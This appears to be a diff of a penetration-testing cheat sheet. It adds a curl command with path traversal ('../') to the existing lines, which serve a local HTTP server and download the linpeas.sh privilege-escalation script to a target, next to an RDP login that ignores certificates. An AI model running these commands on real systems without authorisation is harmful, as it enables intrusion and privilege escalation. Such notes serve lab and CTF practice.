@@ -95,6 +95,7 @@ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$ip:3389 /u:Administrato
 python3 -m http.server 8000
 wget http://10.10.10.10:8000/linpeas.sh
 curl http://10.10.10.10:8000/linpeas.sh -O linpeas.sh
+curl --path-as-is http://10.10.10.10:8000/../../../../linpeas.sh -O linpeas.sh
 ```
 ## windows ✅
 ```bash 
